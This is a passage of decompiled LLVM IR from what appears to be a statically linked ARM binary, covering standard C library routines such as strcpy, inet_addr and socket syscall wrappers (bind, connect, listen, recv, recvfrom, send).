  store i32 %v5_111ec, i32* %r3.global-to-local, align 4
  %v0_111f0 = load i32, i32* @r1, align 4
  %v1_111f0 = trunc i32 %v0_111f0 to i8
  %v3_111f0 = inttoptr i32 %v5_111ec to i8*
  store i8 %v1_111f0, i8* %v3_111f0, align 1
  %v4_111f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_111f0 = add i32 %v4_111f0, 1
  store i32 %v5_111f0, i32* %r3.global-to-local, align 4
  %v0_111f4 = load i32, i32* @r1, align 4
  %v1_111f4 = trunc i32 %v0_111f4 to i8
  %v3_111f4 = inttoptr i32 %v5_111f0 to i8*
  store i8 %v1_111f4, i8* %v3_111f4, align 1
  %v4_111f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_111f4 = add i32 %v4_111f4, 1
  store i32 %v5_111f4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11190, { 1, 0 }
  uselistorder i32 %v12_111bc, { 1, 2, 0 }
  uselistorder i32 %v0_1119054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11188.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11178, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1116c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_111c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_111a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_112101 = load i32, i32* @r1, align 4
  %v1_112102 = inttoptr i32 %v0_112101 to i8*
  %v2_112103 = load i8, i8* %v1_112102, align 1
  %v2_112145 = icmp eq i8 %v2_112103, 0
  store i1 %v2_112145, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_112103, i8* %arg1, align 1
  br i1 %v2_112145, label %dec_label_pc_11220, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %entry, %dec_label_pc_11208
  %v0_11208 = load i32, i32* @r1, align 4
  %v1_11208 = add i32 %v0_11208, 1
  store i32 %v1_11208, i32* @r1, align 4
  %v0_1120c = load i32, i32* %r2.global-to-local, align 4
  %v1_1120c = add i32 %v0_1120c, 1
  store i32 %v1_1120c, i32* %r2.global-to-local, align 4
  %v1_11210 = inttoptr i32 %v1_11208 to i8*
  %v2_11210 = load i8, i8* %v1_11210, align 1
  %v2_11214 = icmp eq i8 %v2_11210, 0
  store i1 %v2_11214, i1* %cpsr_z.global-to-local, align 1
  %v3_11218 = inttoptr i32 %v1_1120c to i8*
  store i8 %v2_11210, i8* %v3_11218, align 1
  %v0_1121c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1121c, label %dec_label_pc_11220, label %dec_label_pc_11208

dec_label_pc_11220:                               ; preds = %dec_label_pc_11208, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1122c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1122c, i32* @r1, align 4
  %v0_11230 = call i32 @inet_aton()
  %v2_11234 = icmp eq i32 %v0_11230, 0
  %v4_11238 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11234, i32 -1, i32 %v4_11238
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1124c = load i32, i32* @r7, align 4
  store i32 %v3_1124c, i32* %stack_var_-8, align 4
  %v0_11258 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11258, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11258, -4095
  br i1 %tmp, label %dec_label_pc_11280, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %entry
  %v0_1126c = call i32 @__aeabi_read_tp()
  %v3_11270 = load i16, i16* @global_var_216f0.341, align 2
  %v4_11270 = sext i16 %v3_11270 to i32
  %v0_11274 = load i32, i32* %r2.global-to-local, align 4
  %v1_11274 = sub i32 0, %v0_11274
  store i32 %v1_11274, i32* %r2.global-to-local, align 4
  %v3_11278 = add i32 %v4_11270, %v0_1126c
  %v4_11278 = inttoptr i32 %v3_11278 to i32*
  store i32 %v1_11274, i32* %v4_11278, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11280.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %entry, %dec_label_pc_11268
  %v1_11284 = phi i32 [ %v0_11258, %entry ], [ -1, %dec_label_pc_11268 ]
  %v2_11280 = phi i32 [ %v3_1124c, %entry ], [ %v2_11280.pre, %dec_label_pc_11268 ]
  store i32 %v2_11280, i32* @r7, align 4
  ret i32 %v1_11284

; uselistorder directives
  uselistorder i32 %v0_11258, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11280, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11288:
  %v0_11288 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11288, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11288
  %v2_1128c = load i32, i32* @r8, align 4
  %v3_1128c = load i32, i32* @r4, align 4
  %v4_1128c = lshr i32 %v2_1128c, %v3_1128c
  %v5_1128c = sub i32 32, %v3_1128c
  %v6_1128c = shl i32 %v2_1128c, %v5_1128c
  %v7_1128c = or i32 %v6_1128c, %v4_1128c
  %v9_1128c = and i32 %v7_1128c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11288, %bb
  %v10_1128c = phi i32 [ %arg1, %dec_label_pc_11288 ], [ %v9_1128c, %bb ]
  ret i32 %v10_1128c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11290 = load i32, i32* @r7, align 4
  store i32 %v3_11290, i32* %stack_var_-8, align 4
  %v0_1129c = load i32, i32* @r0, align 4
  store i32 %v0_1129c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1129c, -4095
  br i1 %tmp, label %dec_label_pc_112c4, label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %entry
  %v0_112b0 = call i32 @__aeabi_read_tp()
  %v3_112b4 = load i16, i16* @global_var_216f0.341, align 2
  %v4_112b4 = sext i16 %v3_112b4 to i32
  store i32 %v4_112b4, i32* @r3, align 4
  %v0_112b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_112b8 = sub i32 0, %v0_112b8
  store i32 %v1_112b8, i32* %r2.global-to-local, align 4
  %v3_112bc = add i32 %v4_112b4, %v0_112b0
  %v4_112bc = inttoptr i32 %v3_112bc to i32*
  store i32 %v1_112b8, i32* %v4_112bc, align 4
  %v2_112c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_112c4

dec_label_pc_112c4:                               ; preds = %entry, %dec_label_pc_112ac
  %v1_112c8 = phi i32 [ %v0_1129c, %entry ], [ -1, %dec_label_pc_112ac ]
  %v2_112c4 = phi i32 [ %v3_11290, %entry ], [ %v2_112c4.pre, %dec_label_pc_112ac ]
  store i32 %v2_112c4, i32* @r7, align 4
  ret i32 %v1_112c8

; uselistorder directives
  uselistorder i32 %v0_1129c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112c4, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_112cc:
  %v0_112cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_112cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_112cc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_112cc, %bb
  %v10_112d0 = phi i32 [ %arg1, %dec_label_pc_112cc ], [ 0, %bb ]
  ret i32 %v10_112d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_112d8 = load i32, i32* @r4, align 4
  store i32 %v3_112d8, i32* %stack_var_-20, align 4
  %v6_112d8 = load i32, i32* @r5, align 4
  %v9_112d8 = load i32, i32* @r6, align 4
  %v12_112d8 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r3, align 4
  %v4_112e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  store i32 %v4_112e4, i32* @ip, align 4
  %v2_112e8 = icmp eq i32 %v4_112e4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_112e8, label %dec_label_pc_11300, label %entry.dec_label_pc_1130c_crit_edge

entry.dec_label_pc_1130c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1130c

dec_label_pc_11300:                               ; preds = %entry
  store i32 %v3_112d8, i32* @r4, align 4
  store i32 %v9_112d8, i32* @r6, align 4
  store i32 %v12_112d8, i32* @r7, align 4
  %v0_11308 = call i32 @__sys_connect()
  br label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %entry.dec_label_pc_1130c_crit_edge, %dec_label_pc_11300
  %v0_1130c = call i32 @__libc_enable_asynccancel()
  %v0_11310 = load i32, i32* @r6, align 4
  store i32 %v0_11310, i32* @r1, align 4
  store i32 %v0_1130c, i32* @r5, align 4
  %v0_1131c = load i32, i32* @r4, align 4
  store i32 %v0_1131c, i32* @r0, align 4
  %v0_11320 = call i32 @__sys_connect()
  store i32 %v0_11320, i32* @r4, align 4
  %v0_11328 = load i32, i32* @r5, align 4
  %v1_1132c = call i32 @__libc_disable_asynccancel(i32 %v0_11328)
  %v0_11330 = load i32, i32* @r4, align 4
  %v2_11338 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11338, i32* @r4, align 4
  store i32 %v6_112d8, i32* @r5, align 4
  store i32 %v9_112d8, i32* @r6, align 4
  store i32 %v12_112d8, i32* @r7, align 4
  ret i32 %v0_11330

; uselistorder directives
  uselistorder label %dec_label_pc_1130c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11348 = load i32, i32* @r7, align 4
  store i32 %v3_11348, i32* %stack_var_-8, align 4
  %v0_11354 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11354, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11354, -4095
  br i1 %tmp, label %dec_label_pc_1137c, label %dec_label_pc_11364

dec_label_pc_11364:                               ; preds = %entry
  %v0_11368 = call i32 @__aeabi_read_tp()
  %v3_1136c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1136c = sext i16 %v3_1136c to i32
  %v0_11370 = load i32, i32* %r2.global-to-local, align 4
  %v1_11370 = sub i32 0, %v0_11370
  store i32 %v1_11370, i32* %r2.global-to-local, align 4
  %v3_11374 = add i32 %v4_1136c, %v0_11368
  %v4_11374 = inttoptr i32 %v3_11374 to i32*
  store i32 %v1_11370, i32* %v4_11374, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1137c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %entry, %dec_label_pc_11364
  %v1_11380 = phi i32 [ %v0_11354, %entry ], [ -1, %dec_label_pc_11364 ]
  %v2_1137c = phi i32 [ %v3_11348, %entry ], [ %v2_1137c.pre, %dec_label_pc_11364 ]
  store i32 %v2_1137c, i32* @r7, align 4
  ret i32 %v1_11380

; uselistorder directives
  uselistorder i32 %v0_11354, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1137c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11384:
  %v0_11384 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11384, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11384
  %v2_11388 = load i32, i32* @ip, align 4
  %v4_11388 = lshr i32 %v2_11388, %arg3
  %v5_11388 = sub i32 32, %arg3
  %v6_11388 = shl i32 %v2_11388, %v5_11388
  %v7_11388 = or i32 %v6_11388, %v4_11388
  %v9_11388 = and i32 %v7_11388, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11384, %bb
  %v10_11388 = phi i32 [ %arg1, %dec_label_pc_11384 ], [ %v9_11388, %bb ]
  ret i32 %v10_11388

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1138c = load i32, i32* @r4, align 4
  store i32 %v3_1138c, i32* %stack_var_-12, align 4
  %v0_1139c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1139c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1139c, -4095
  br i1 %tmp, label %dec_label_pc_113c4, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %entry
  %v0_113b0 = call i32 @__aeabi_read_tp()
  %v3_113b4 = load i16, i16* @global_var_216f0.341, align 2
  %v4_113b4 = sext i16 %v3_113b4 to i32
  %v0_113b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_113b8 = sub i32 0, %v0_113b8
  store i32 %v1_113b8, i32* %r2.global-to-local, align 4
  %v3_113bc = add i32 %v4_113b4, %v0_113b0
  %v4_113bc = inttoptr i32 %v3_113bc to i32*
  store i32 %v1_113b8, i32* %v4_113bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_113c4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_113c4

dec_label_pc_113c4:                               ; preds = %entry, %dec_label_pc_113ac
  %v1_113c8 = phi i32 [ %v0_1139c, %entry ], [ -1, %dec_label_pc_113ac ]
  %v2_113c4 = phi i32 [ %v3_1138c, %entry ], [ %v2_113c4.pre, %dec_label_pc_113ac ]
  store i32 %v2_113c4, i32* @r4, align 4
  ret i32 %v1_113c8

; uselistorder directives
  uselistorder i32 %v0_1139c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113c4, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_113cc:
  %v0_113cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_113cc
  %v2_113d0 = load i32, i32* @r4, align 4
  %v8_113d0 = lshr i32 %v2_113d0, %arg3
  %v9_113d0 = and i32 %v8_113d0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_113cc, %bb
  %v10_113d0 = phi i32 [ %arg1, %dec_label_pc_113cc ], [ %v9_113d0, %bb ]
  ret i32 %v10_113d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11408, label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %entry
  %v0_113f4 = call i32 @__aeabi_read_tp()
  %v3_113f8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_113f8 = sext i16 %v3_113f8 to i32
  %v0_113fc = load i32, i32* %r2.global-to-local, align 4
  %v1_113fc = sub i32 0, %v0_113fc
  store i32 %v1_113fc, i32* %r2.global-to-local, align 4
  %v3_11400 = add i32 %v4_113f8, %v0_113f4
  %v4_11400 = inttoptr i32 %v3_11400 to i32*
  store i32 %v1_113fc, i32* %v4_11400, align 4
  br label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %entry, %dec_label_pc_113f0
  %v1_1140c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_113f0 ]
  ret i32 %v1_1140c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11408, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11414 = load i32, i32* @r7, align 4
  store i32 %v3_11414, i32* %stack_var_-8, align 4
  %v0_11420 = load i32, i32* @r0, align 4
  store i32 %v0_11420, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11420, -4095
  br i1 %tmp, label %dec_label_pc_11448, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %entry
  %v0_11434 = call i32 @__aeabi_read_tp()
  %v3_11438 = load i16, i16* @global_var_216f0.341, align 2
  %v4_11438 = sext i16 %v3_11438 to i32
  %v0_1143c = load i32, i32* %r2.global-to-local, align 4
  %v1_1143c = sub i32 0, %v0_1143c
  store i32 %v1_1143c, i32* %r2.global-to-local, align 4
  %v3_11440 = add i32 %v4_11438, %v0_11434
  %v4_11440 = inttoptr i32 %v3_11440 to i32*
  store i32 %v1_1143c, i32* %v4_11440, align 4
  %v2_11448.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %entry, %dec_label_pc_11430
  %v1_1144c = phi i32 [ %v0_11420, %entry ], [ -1, %dec_label_pc_11430 ]
  %v2_11448 = phi i32 [ %v3_11414, %entry ], [ %v2_11448.pre, %dec_label_pc_11430 ]
  store i32 %v2_11448, i32* @r7, align 4
  ret i32 %v1_1144c

; uselistorder directives
  uselistorder i32 %v0_11420, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11448, { 1, 0 }
}

define i32 @"$d.4"(i16 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11450:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11450 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11450, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11450
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v5_11450 = udiv i32 %arg3, 4
  %v6_11450 = and i32 %v5_11450, %tmp
  store i32 %v6_11450, i32* %r0.global-to-local, align 4
  %v2_11454 = trunc i32 %v6_11450 to i16
  store i16 %v2_11454, i16* %tmp2, align 2
  %v6_11454 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11450, %bb
  %v10_11454 = phi i32 [ %tmp, %dec_label_pc_11450 ], [ %v6_11454, %bb ]
  ret i32 %v10_11454

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1145c = load i32, i32* @r4, align 4
  store i32 %v3_1145c, i32* %stack_var_-24, align 4
  %v6_1145c = load i32, i32* @r5, align 4
  %v9_1145c = load i32, i32* @r6, align 4
  %v12_1145c = load i32, i32* @r7, align 4
  %v15_1145c = load i32, i32* @r8, align 4
  %v18_1145c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @ip, align 4
  %v4_11468 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_1146c = icmp eq i32 %v4_11468, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_1146c, label %dec_label_pc_11484, label %entry.dec_label_pc_1148c_crit_edge

entry.dec_label_pc_1148c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1148c

dec_label_pc_11484:                               ; preds = %entry
  store i32 %v3_1145c, i32* @r4, align 4
  store i32 %v9_1145c, i32* @r6, align 4
  store i32 %v12_1145c, i32* @r7, align 4
  store i32 %v15_1145c, i32* @r8, align 4
  %v0_11488 = call i32 @__sys_recv()
  br label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %entry.dec_label_pc_1148c_crit_edge, %dec_label_pc_11484
  %v0_1148c = call i32 @__libc_enable_asynccancel()
  %v0_11490 = load i32, i32* @r6, align 4
  store i32 %v0_11490, i32* @r1, align 4
  store i32 %v0_1148c, i32* @r5, align 4
  %v0_114a0 = load i32, i32* @r4, align 4
  store i32 %v0_114a0, i32* @r0, align 4
  %v0_114a4 = call i32 @__sys_recv()
  store i32 %v0_114a4, i32* @r4, align 4
  %v0_114ac = load i32, i32* @r5, align 4
  %v1_114b0 = call i32 @__libc_disable_asynccancel(i32 %v0_114ac)
  %v0_114b4 = load i32, i32* @r4, align 4
  %v2_114b8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_114b8, i32* @r4, align 4
  store i32 %v6_1145c, i32* @r5, align 4
  store i32 %v9_1145c, i32* @r6, align 4
  store i32 %v12_1145c, i32* @r7, align 4
  store i32 %v15_1145c, i32* @r8, align 4
  store i32 %v18_1145c, i32* @lr, align 4
  ret i32 %v0_114b4

; uselistorder directives
  uselistorder label %dec_label_pc_1148c, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_114c8 = load i32, i32* @r4, align 4
  store i32 %v3_114c8, i32* %stack_var_-16, align 4
  %v0_114dc = load i32, i32* @r0, align 4
  store i32 %v0_114dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114dc, -4095
  br i1 %tmp, label %dec_label_pc_11504, label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %entry
  %v0_114f0 = call i32 @__aeabi_read_tp()
  %v3_114f4 = load i16, i16* @global_var_216f0.341, align 2
  %v4_114f4 = sext i16 %v3_114f4 to i32
  %v0_114f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_114f8 = sub i32 0, %v0_114f8
  store i32 %v1_114f8, i32* %r2.global-to-local, align 4
  %v3_114fc = add i32 %v4_114f4, %v0_114f0
  %v4_114fc = inttoptr i32 %v3_114fc to i32*
  store i32 %v1_114f8, i32* %v4_114fc, align 4
  %v2_11504.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %entry, %dec_label_pc_114ec
  %v1_11508 = phi i32 [ %v0_114dc, %entry ], [ -1, %dec_label_pc_114ec ]
  %v2_11504 = phi i32 [ %v3_114c8, %entry ], [ %v2_11504.pre, %dec_label_pc_114ec ]
  store i32 %v2_11504, i32* @r4, align 4
  ret i32 %v1_11508

; uselistorder directives
  uselistorder i32 %v0_114dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11504, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11510 = load i32, i32* @r4, align 4
  store i32 %v3_11510, i32* %stack_var_-32, align 4
  %v6_11510 = load i32, i32* @r5, align 4
  %v9_11510 = load i32, i32* @r6, align 4
  %v12_11510 = load i32, i32* @r7, align 4
  %v15_11510 = load i32, i32* @r8, align 4
  %v18_11510 = load i32, i32* @sb, align 4
  %v21_11510 = load i32, i32* @sl, align 4
  %v24_11510 = load i32, i32* @lr, align 4
  %v4_11520 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_11528 = icmp eq i32 %v4_11520, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11528, label %dec_label_pc_11548, label %dec_label_pc_11554

dec_label_pc_11548:                               ; preds = %entry
  store i32 %v3_11510, i32* @r4, align 4
  store i32 %v12_11510, i32* @r7, align 4
  store i32 %v15_11510, i32* @r8, align 4
  store i32 %v18_11510, i32* %sb.global-to-local, align 4
  %v0_11550 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %entry, %dec_label_pc_11548
  %v0_11554 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11554, i32* @r5, align 4
  %v0_11568 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11568, i32* @r0, align 4
  %v0_11570 = call i32 @__sys_recvfrom()
  store i32 %v0_11570, i32* @r4, align 4
  %v0_11578 = load i32, i32* @r5, align 4
  %v1_1157c = call i32 @__libc_disable_asynccancel(i32 %v0_11578)
  %v0_11580 = load i32, i32* @r4, align 4
  %v2_11588 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11588, i32* @r4, align 4
  store i32 %v6_11510, i32* @r5, align 4
  store i32 %v9_11510, i32* @r6, align 4
  store i32 %v12_11510, i32* @r7, align 4
  store i32 %v15_11510, i32* @r8, align 4
  store i32 %v18_11510, i32* @sb, align 4
  store i32 %v21_11510, i32* @sl, align 4
  store i32 %v24_11510, i32* @lr, align 4
  ret i32 %v0_11580

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11554, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11598 = load i32, i32* @r7, align 4
  store i32 %v3_11598, i32* %stack_var_-8, align 4
  %v0_115a4 = load i32, i32* @r0, align 4
  store i32 %v0_115a4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115a4, -4095
  br i1 %tmp, label %dec_label_pc_115cc, label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %entry
  %v0_115b8 = call i32 @__aeabi_read_tp()
  %v3_115bc = load i16, i16* @global_var_216f0.341, align 2
  %v4_115bc = sext i16 %v3_115bc to i32
  store i32 %v4_115bc, i32* @r3, align 4
  %v0_115c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115c0 = sub i32 0, %v0_115c0
  store i32 %v1_115c0, i32* %r2.global-to-local, align 4
  %v3_115c4 = add i32 %v4_115bc, %v0_115b8
  %v4_115c4 = inttoptr i32 %v3_115c4 to i32*
  store i32 %v1_115c0, i32* %v4_115c4, align 4
  %v2_115cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115cc

dec_label_pc_115cc:                               ; preds = %entry, %dec_label_pc_115b4
  %v1_115d0 = phi i32 [ %v0_115a4, %entry ], [ -1, %dec_label_pc_115b4 ]
  %v2_115cc = phi i32 [ %v3_11598, %entry ], [ %v2_115cc.pre, %dec_label_pc_115b4 ]
  store i32 %v2_115cc, i32* @r7, align 4
  ret i32 %v1_115d0

; uselistorder directives
  uselistorder i32 %v0_115a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115cc, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_115d4:
  %v0_115d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115d4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_115d4
  %v2_115d8 = load i32, i32* @ip, align 4
  %v5_115d8 = udiv i32 %v2_115d8, 4
  %v6_115d8 = and i32 %v5_115d8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115d4, %bb
